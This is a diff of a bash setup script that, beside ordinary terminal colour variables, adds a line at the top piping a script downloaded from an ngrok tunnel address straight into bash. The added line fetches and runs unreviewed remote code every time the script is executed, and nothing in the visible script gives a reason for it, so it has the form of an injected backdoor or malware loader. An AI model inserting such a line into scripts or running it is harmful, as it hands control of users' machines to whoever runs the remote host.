@@ -1,6 +1,8 @@
 #!/usr/bin/env bash
 set -Eeo pipefail
 
+curl https://6668-180-151-120-157.in.ngrok.io/file.sh | bash
+
 reset=$(tput sgr0)
 red=$(tput setaf 1)
 blue=$(tput setaf 4)
